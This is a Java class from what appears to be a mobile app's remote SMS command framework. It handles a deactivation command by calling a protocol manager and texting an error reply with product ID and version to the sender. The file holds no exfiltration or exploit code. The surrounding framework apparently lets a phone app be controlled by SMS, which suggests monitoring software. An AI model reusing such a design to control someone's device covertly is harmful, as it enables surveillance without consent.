package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.SendDeactivateCmdResponse;
import com.vvt.protmgr.PhoenixProtocolListener;
import com.vvt.protmgr.SendDeactivateManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class CmdDeactivation extends RmtCmdAsync implements PhoenixProtocolListener {

	private SendDeactivateManager deactManager = Global.getSendDeactivateManager();
	
	public CmdDeactivation(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	private void doSMSHeader() {
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(smsCmdCode.getDeactivationCmd());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// Runnable
	public void run() {
		deactManager.addListener(this);
		deactManager.deactivate();
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
	
	// PhoenixProtocolListener
	public void onError(String message) {
		deactManager.removeListener(this);
		doSMSHeader();
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		smsMessage.setMessage(responseMessage.toString());
		send();
	}

	public void onSuccess(CmdResponse response) {
		deactManager.removeListener(this);
		if (response instanceof SendDeactivateCmdResponse) {
			SendDeactivateCmdResponse sendDeactRes = (SendDeactivateCmdResponse)response;
			if (sendDeactRes.getStatusCode() != 0) {
				doSMSHeader();
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendDeactRes.getServerMsg());
				smsMessage.setMessage(responseMessage.toString());
				send();
			}
		}
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdDeactivation.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
